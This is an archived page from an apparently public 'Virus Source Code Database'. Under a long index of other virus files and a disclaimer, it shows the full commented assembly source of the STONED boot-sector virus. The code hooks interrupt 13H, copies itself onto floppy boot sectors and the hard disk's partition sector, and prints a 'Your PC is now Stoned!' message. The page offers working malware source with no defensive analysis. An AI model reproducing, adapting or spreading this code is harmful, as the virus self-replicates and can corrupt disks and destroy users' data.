<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: stoned_asm</title>
<meta name="KEYWORDS" content="stoned.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for stoned.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="s2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s2_asm.php">s2_asm</a><br>
<a href="sabbath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sabbath_asm.php">sabbath_asm</a><br>
<a href="sad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sad_asm.php">sad_asm</a><br>
<a href="saddam_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saddam_pas.php">saddam_pas</a><br>
<a href="sample_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sample_asm.php">sample_asm</a><br>
<a href="santa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/santa_asm.php">santa_asm</a><br>
<a href="saratoga_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saratoga_asm.php">saratoga_asm</a><br>
<a href="satanbg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbg_asm.php">satanbg_asm</a><br>
<a href="satanbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbug_asm.php">satanbug_asm</a><br>
<a href="satnlh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satnlh_asm.php">satnlh_asm</a><br>
<a href="sbwhywin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sbwhywin_asm.php">sbwhywin_asm</a><br>
<a href="sc89_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sc89_asm.php">sc89_asm</a><br>
<a href="s_canada_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_canada_asm.php">s_canada_asm</a><br>
<a href="scarey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scarey_asm.php">scarey_asm</a><br>
<a href="schrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/schrunch_asm.php">schrunch_asm</a><br>
<a href="scorpio_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scorpio_pas.php">scorpio_pas</a><br>
<a href="scramble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scramble_asm.php">scramble_asm</a><br>
<a href="screw_fi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/screw_fi_asm.php">screw_fi_asm</a><br>
<a href="scroll__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll__asm.php">scroll__asm</a><br>
<a href="scroll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll_asm.php">scroll_asm</a><br>
<a href="scrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scrunch_asm.php">scrunch_asm</a><br>
<a href="sdfe_gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sdfe_gen_asm.php">sdfe_gen_asm</a><br>
<a href="seneca_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/seneca_asm.php">seneca_asm</a><br>
<a href="senecab_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/senecab_asm.php">senecab_asm</a><br>
<a href="sent4625_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sent4625_pas.php">sent4625_pas</a><br>
<a href="sentinel_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sentinel_pas.php">sentinel_pas</a><br>
<a href="serg114_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg114_asm.php">serg114_asm</a><br>
<a href="serg118e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg118e_asm.php">serg118e_asm</a><br>
<a href="sergant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sergant_asm.php">sergant_asm</a><br>
<a href="setuprot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/setuprot_asm.php">setuprot_asm</a><br>
<a href="sex666_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sex666_asm.php">sex666_asm</a><br>
<a href="sf_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sf_ii_asm.php">sf_ii_asm</a><br>
<a href="sgarden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sgarden_asm.php">sgarden_asm</a><br>
<a href="shake_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shake_asm.php">shake_asm</a><br>
<a href="s_happy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_happy_asm.php">s_happy_asm</a><br>
<a href="shellt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shellt_asm.php">shellt_asm</a><br>
<a href="shhs__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs__asm.php">shhs__asm</a><br>
<a href="shhs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs_asm.php">shhs_asm</a><br>
<a href="shimmer2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer2_asm.php">shimmer2_asm</a><br>
<a href="shimmer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer_asm.php">shimmer_asm</a><br>
<a href="shock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shock_asm.php">shock_asm</a><br>
<a href="shy_koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy_koo_asm.php">shy_koo_asm</a><br>
<a href="shy-koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy-koo_asm.php">shy-koo_asm</a><br>
<a href="silence2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence2_asm.php">silence2_asm</a><br>
<a href="silence_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence_asm.php">silence_asm</a><br>
<a href="simplex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/simplex_asm.php">simplex_asm</a><br>
<a href="sister_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sister_asm.php">sister_asm</a><br>
<a href="sist_j4j_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sist_j4j_asm.php">sist_j4j_asm</a><br>
<a href="sk1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk1_asm.php">sk1_asm</a><br>
<a href="sk20h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk20h_asm.php">sk20h_asm</a><br>
<a href="sk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk2_asm.php">sk2_asm</a><br>
<a href="sk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk_asm.php">sk_asm</a><br>
<a href="skeleton_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skeleton_asm.php">skeleton_asm</a><br>
<a href="skism808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skism808_asm.php">skism808_asm</a><br>
<a href="s_leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_leszop_asm.php">s_leszop_asm</a><br>
<a href="smash_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smash_asm.php">smash_asm</a><br>
<a href="smile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smile_asm.php">smile_asm</a><br>
<a href="smlboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smlboot_asm.php">smlboot_asm</a><br>
<a href="smurf__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf__asm.php">smurf__asm</a><br>
<a href="smurf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf_asm.php">smurf_asm</a><br>
<a href="sobj3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sobj3_asm.php">sobj3_asm</a><br>
<a href="sound_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sound_asm.php">sound_asm</a><br>
<a href="spawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/spawn_asm.php">spawn_asm</a><br>
<a href="sq2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sq2_asm.php">sq2_asm</a><br>
<a href="squish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/squish_asm.php">squish_asm</a><br>
<a href="sra1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra1__asm.php">sra1__asm</a><br>
<a href="sra2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2__asm.php">sra2__asm</a><br>
<a href="sra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2_asm.php">sra2_asm</a><br>
<a href="sra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra3_asm.php">sra3_asm</a><br>
<a href="ssss4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ssss4_asm.php">ssss4_asm</a><br>
<a href="stack__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack__asm.php">stack__asm</a><br>
<a href="stack_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack_asm.php">stack_asm</a><br>
<a href="stackvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stackvir_asm.php">stackvir_asm</a><br>
<a href="stealth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth__asm.php">stealth__asm</a><br>
<a href="stealth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth_asm.php">stealth_asm</a><br>
<a href="ster1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster1_asm.php">ster1_asm</a><br>
<a href="ster2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster2_asm.php">ster2_asm</a><br>
<a href="stercul2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stercul2_asm.php">stercul2_asm</a><br>
<a href="sterculi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sterculi_asm.php">sterculi_asm</a><br>
<a href="stioxyl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stioxyl_asm.php">stioxyl_asm</a><br>
<a href="stned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stned_asm.php">stned_asm</a><br>
<a href="sto_drop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sto_drop_asm.php">sto_drop_asm</a><br>
<a href="stond____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond____asm.php">stond____asm</a><br>
<a href="stond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond_asm.php">stond_asm</a><br>
<a href="stone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone_asm.php">stone_asm</a><br>
<a href="stoned1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned1_asm.php">stoned1_asm</a><br>
<a href="stoned_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_2_asm.php">stoned_2_asm</a><br>
<a href="stoned2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned2_asm.php">stoned2_asm</a><br>
<a href="stoned3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned3_asm.php">stoned3_asm</a><br>
<a href="stoned4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned4_asm.php">stoned4_asm</a><br>
<a href="stoned___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned___asm.php">stoned___asm</a><br>
<a href="stoned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_asm.php">stoned_asm</a><br>
<a href="stoned_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_f_asm.php">stoned_f_asm</a><br>
<a href="stonedii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stonedii_asm.php">stonedii_asm</a><br>
<a href="stoneds_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoneds_asm.php">stoneds_asm</a><br>
<a href="stone-ef_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone-ef_asm.php">stone-ef_asm</a><br>
<a href="stranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stranger_asm.php">stranger_asm</a><br>
<a href="stub_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_____asm.php">stub_____asm</a><br>
<a href="stub____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub____asm.php">stub____asm</a><br>
<a href="stub___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub___asm.php">stub___asm</a><br>
<a href="stub__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub__asm.php">stub__asm</a><br>
<a href="stub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_asm.php">stub_asm</a><br>
<a href="sturm&amp;_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sturm&_asm.php">sturm&_asm</a><br>
<a href="styx-5b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/styx-5b_asm.php">styx-5b_asm</a><br>
<a href="sumsdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sumsdos_asm.php">sumsdos_asm</a><br>
<a href="sundevil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sundevil_asm.php">sundevil_asm</a><br>
<a href="suriv101_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv101_asm.php">suriv101_asm</a><br>
<a href="suriv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv_asm.php">suriv_asm</a><br>
<a href="survive__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive__asm.php">survive__asm</a><br>
<a href="survive_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive_asm.php">survive_asm</a><br>
<a href="susan1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1__asm.php">susan1__asm</a><br>
<a href="susan1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1_asm.php">susan1_asm</a><br>
<a href="susan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan_asm.php">susan_asm</a><br>
<a href="swansngb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansngb_asm.php">swansngb_asm</a><br>
<a href="swansong_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansong_asm.php">swansong_asm</a><br>
<a href="swap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swap_asm.php">swap_asm</a><br>
<a href="sw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw__asm.php">sw__asm</a><br>
<a href="sw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw_asm.php">sw_asm</a><br>
<a href="swedish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish__asm.php">swedish__asm</a><br>
<a href="swedish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish_asm.php">swedish_asm</a><br>
<a href="s_wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_wxyc_asm.php">s_wxyc_asm</a><br>
<a href="s-wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s-wxyc_asm.php">s-wxyc_asm</a><br>
<a href="sylvia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sylvia_asm.php">sylvia_asm</a><br>
<a href="sysinfct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sysinfct_asm.php">sysinfct_asm</a><br>
<a href="syslock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslock_asm.php">syslock_asm</a><br>
<a href="syslockm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslockm_asm.php">syslockm_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;The STONED virus!

int13_Off       EQU     0004CH                  ;interrupt 13H location
int13_Seg       EQU     0004EH


VIRUS           SEGMENT BYTE
                ASSUME CS:VIRUS, DS:VIRUS, ES:VIRUS, SS:VIRUS

;*****************************************************************************
;The following jump instruction is only needed to be able to generate a COM
;file with this assembly listing.

                ORG     100H

START:          JMP     NEAR PTR START1

;The following three definitions are BIOS data that are used by the virus

                ORG     413H
MEM_SIZE        DW      ?                       ;memory size in kilobytes

                ORG     43FH
MOTOR_STATUS    DB      ?                       ;floppy disk motor status

                ORG     46CH
TIMER           DD      ?                       ;PC 55ms timer count

;*****************************************************************************

                ORG     7C00H

;This is the STONED boot sector virus. The jump instructions here just go
;past the data area and the viral interrupt 13H handler. The first four
;bytes of this code, EA 05 00 0C, also serve the virus to identify itself
;on a floppy disk or the hard disk.

START1:         DB      0EAH,5,0,0C0H,7         ;JMP FAR PTR START2
START2:         JMP     NEAR PTR START3         ;go to startup routine

;*****************************************************************************

;Data area for the virus

DRIVE_NO        DB      0                       ;Which drive is being booted
OLD_INT13_OFF   DW      0                       ;BIOS int 13 handler offset
OLD_INT13_SEG   DW      0                       ;BIOS int 13 handler segment
HIMEM_OFS       DW      OFFSET HIMEM - 7C00H    ;Viral int 13 handler offset
HIMEM_SEG       DW      0                       ;Viral int 13 handler segment
BOOT_SEC_START  DD      00007C00H               ;Boot sector boot address

;*****************************************************************************

;This is the viral interrupt 13H handler. It simply looks for attempts to
;read or write to the floppy disk. Any reads or writes to the floppy get
;trapped and the INFECT_FLOPPY routine is first called.

INT_13H:        PUSH    DS                      ;Viral int 13H handler
                PUSH    AX
                CMP     AH,2                    ;Look for functions 2 & 3
                JB      GOTO_BIOS               ;else go to BIOS int 13 handler
                CMP     AH,4
                JNB     GOTO_BIOS
                OR      DL,DL                   ;are we reading disk 0?
                JNE     GOTO_BIOS               ;no, go to BIOS int 13 handler
                XOR     AX,AX                   ;yes, activate virus now
                MOV     DS,AX                   ;set ds=0
                MOV     AL,[MOTOR_STATUS]       ;disk motor status
                TEST    AL,1                    ;is motor on drive 0 running?
                JNZ     GOTO_BIOS               ;yes, let BIOS handle it
                CALL    INFECT_FLOPPY           ;go infect the floppy disk in A
GOTO_BIOS:      POP     AX                      ;restore ax and ds
                POP     DS                      ;and let BIOS do the read/write
                JMP     DWORD PTR CS:[OLD_INT13_OFF-7C00H]  ;Jump to old int 13

;*****************************************************************************

;This routine infects the floppy in the A drive. It first checks the floppy to
;make sure it is not already infected, by reading the boot sector from it into
;memory, and comparing the first four bytes with the first four bytes of the
;viral boot sector, which is already in memory. If they are not the same,
;the infection routine rewrites the original boot sector to Cyl 0, Hd 1, Sec 3
;which is the last sector in the root directory. As long as the root directory
;has less than __ entries in it, there is no problem in doing this. Then,
;the virus writes itself to Cyl 0, Hd 0, Sec 1, the actual boot sector.

INFECT_FLOPPY:
                PUSH    BX                      ;save everything
                PUSH    CX
                PUSH    DX
                PUSH    ES
                PUSH    SI
                PUSH    DI
                MOV     SI,4                    ;retry counter
READ_LOOP:      MOV     AX,201H                 ;read boot sector from floppy
                PUSH    CS
                POP     ES                      ;es=cs (here)
                MOV     BX,200H                 ;read to buffer at end of virus
                XOR     CX,CX                   ;dx=cx=0
                MOV     DX,CX                   ;read Cyl 0, Hd 0, Sec 1,
                INC     CX                      ;the floppy boot sector
                PUSHF                           ;fake an int 13H with push/call
                CALL    DWORD PTR CS:[OLD_INT13_OFF-7C00H]
                JNC     CHECK_BOOT_SEC          ;if no error go check bs out
                XOR     AX,AX                   ;error, attempt disk reset
                PUSHF                           ;fake an int 13H again
                CALL    DWORD PTR CS:[OLD_INT13_OFF-7C00H]
                DEC     SI                      ;decrement retry counter
                JNZ     READ_LOOP               ;and try again if counter ok
                JMP     SHORT EXIT_INFECT       ;read failed, get out
                NOP

;Here we determine if the boot sector from the floppy is already infected
CHECK_BOOT_SEC: XOR     SI,SI                   ;si points to the virus in ram
                MOV     DI,200H                 ;di points to bs in question
                CLD
                PUSH    CS                      ;ds=cs
                POP     DS
                LODSW                           ;compare first four bytes of
                CMP     AX,[DI]                 ;the virus to see if the same
                JNE     WRITE_VIRUS             ;no, go put the virus on floppy
                LODSW
                CMP     AX,[DI+2]
                JE      EXIT_INFECT             ;the same, already infected
WRITE_VIRUS:    MOV     AX,301H                 ;write virus to floppy A:
                MOV     BX,200H                 ;first put orig boot sec
                MOV     CL,3                    ;to Cyl 0, Hd 1, Sec 3
                MOV     DH,1                    ;this is the last sector in the
                PUSHF                           ;root directory
                CALL    DWORD PTR CS:[OLD_INT13_OFF-7C00H]      ;fake int 13
                JC      EXIT_INFECT             ;if an error, just get out
                MOV     AX,301H                 ;else write viral boot sec
                XOR     BX,BX                   ;to Cyl 0, Hd 0, Sec 1
                MOV     CL,1                    ;from right here in RAM
                XOR     DX,DX
                PUSHF                           ;fake an int 13 to ROM BIOS
                CALL    DWORD PTR CS:[OLD_INT13_OFF-7C00H]
EXIT_INFECT:    POP     DI                      ;exit the infect routine
                POP     SI                      ;restore everything
                POP     ES
                POP     DX
                POP     CX
                POP     BX
                RET


;*****************************************************************************

;This is the start-up code for the viral boot sector, which is executed when
;the system boots up.

START3:         XOR     AX,AX                   ;Stoned boot sector start-up
                MOV     DS,AX                   ;set ds=ss=0
                CLI                             ;ints off for stack change
                MOV     SS,AX
                MOV     SP,7C00H                ;initialize stack to 0000:7C00
                STI
                MOV     AX,WORD PTR ds:[int13_Off] ;get current int 13H vector
                MOV     [OLD_INT13_OFF],AX      ;and save it here
                MOV     AX,WORD PTR ds:[int13_Seg]
                MOV     [OLD_INT13_SEG],AX
                MOV     AX,[MEM_SIZE]           ;get memory size in 1K blocks
                DEC     AX                      ;subtract 2K from it
                DEC     AX
                MOV     [MEM_SIZE],AX           ;save it back
                MOV     CL,6                    ;Convert mem size to segment
                SHL     AX,CL                   ;value
                MOV     ES,AX                   ;and put it in es
                MOV     [HIMEM_SEG],AX          ;save segment here
                MOV     AX,OFFSET INT_13H - 7C00H  ;now hook interrupt 13H
                MOV     WORD PTR ds:[int13_Off],AX ;into high memory
                MOV     WORD PTR ds:[int13_Seg],ES
                MOV     CX,OFFSET END_VIRUS - 7C00H ;move this much to hi mem
                PUSH    CS
                POP     DS                      ;cs=7C0H from far jmp at start
                XOR     SI,SI                   ;si=di=0
                MOV     DI,SI
                CLD
                REP     MOVSB                   ;move virus to high memory
                JMP     DWORD PTR CS:[HIMEM_OFS-7C00H]  ;and go there
HIMEM:
                MOV     AX,0                    ;reset disk drive
                INT     13H
                XOR     AX,AX
                MOV     ES,AX                   ;es=0
                MOV     AX,201H                 ;prep to load orig boot sector
                MOV     BX,7C00H
                CMP     BYTE PTR CS:[DRIVE_NO-7C00H],0 ;which drive booting from
                JE      FLOPPY_BOOT             ;ok, booting from floppy, do it
HARD_BOOT:
                MOV     CX,7                    ;else booting from hard disk
                MOV     DX,80H                  ;Read Cyl 0, Hd 0, Sec 7
                INT     13H                     ;where orig part sec is stored
                JMP     SHORT GO_BOOT           ;and jump to it
                NOP

FLOPPY_BOOT:    MOV     CX,3                    ;Booting from floppy
                MOV     DX,100H                 ;Read Cyl 0, Hd 1, Sec 3
                INT     13H                     ;where orig boot sec is
                JC      GO_BOOT                 ;if an error go to trash!!
                TEST    BYTE PTR ES:[TIMER],7   ;message display one in 8
                JNZ     MESSAGE_DONE            ;times, else none
                MOV     SI,OFFSET STONED_MSG1 - 7C00H   ;play the message
                PUSH    CS
                POP     DS                      ;ds=cs
MSG_LOOP:       LODSB                           ;get a byte to al
                OR      AL,AL                   ;al=0?
                JZ      MESSAGE_DONE            ;yes, all done
                MOV     AH,0EH                  ;display byte using BIOS
                MOV     BH,0
                INT     10H
                JMP     SHORT MSG_LOOP          ;and go get another

MESSAGE_DONE:   PUSH    CS
                POP     ES                      ;es=cs
                MOV     AX,201H                 ;Attempt to read hard disk BS
                MOV     BX,200H                 ;to infect it if it hasn't been
                MOV     CL,1
                MOV     DX,80H
                INT     13H
                JC      GO_BOOT                 ;try boot if error reading
                PUSH    CS
                POP     DS                      ;check 1st 4 bytes of HD BS
                MOV     SI,200H                 ;to see if it's infected yet
                MOV     DI,0
                LODSW
                CMP     AX,[DI]                 ;check 2 bytes
                JNE     INFECT_HARD_DISK        ;not the same, go infect HD
                LODSW
                CMP     AX,[DI+2]               ;check next 2 bytes
                JNE     INFECT_HARD_DISK        ;not the same, go infect HD

GO_BOOT:        MOV     CS:[DRIVE_NO-7C00H],0   ;zero this for floppy infects
                JMP     CS:[BOOT_SEC_START-7C00H] ;jump to 0000:7C00

INFECT_HARD_DISK:
                MOV     CS:[DRIVE_NO-7C00H],2   ;flag to indicate bs on HD
                MOV     AX,301H                 ;write orig part sec here
                MOV     BX,200H                 ;(Cyl 0, Hd 0, Sec 7)
                MOV     CX,7
                MOV     DX,80H
                INT     13H
                JC      GO_BOOT                 ;error, abort
                PUSH    CS
                POP     DS
                PUSH    CS
                POP     ES                      ;ds=cs=es=high memory
                MOV     SI,OFFSET PART_TABLE - 7C00H + 200H
                MOV     DI,OFFSET PART_TABLE - 7C00H ;move partition tbl into
                MOV     CX,242H                 ;viral boot sector
                REP     MOVSB                   ;242H move clears orig bs in ram
                MOV     AX,0301H                ;write it to the partition BS
                XOR     BX,BX                   ;at Cyl 0, Hd 0, Sec 1
                INC     CL
                INT     13H
                JMP     SHORT GO_BOOT           ;and jump to original boot sec

;*****************************************************************************

;Messages and blank space

STONED_MSG1     DB      7,'Your PC is now Stoned!',7,0DH,0AH,0AH,0
STONED_MSG2     DB      'LEGALISE MARIJUANA!'

END_VIRUS:                                      ;end of the virus

                DB      0,0,0,0,0,0             ;blank space, not used

PART_TABLE:                                     ;space for HD partition table
                DB      16 dup (0)              ;partition 1 entry
                DB      16 dup (0)              ;partition 2 entry
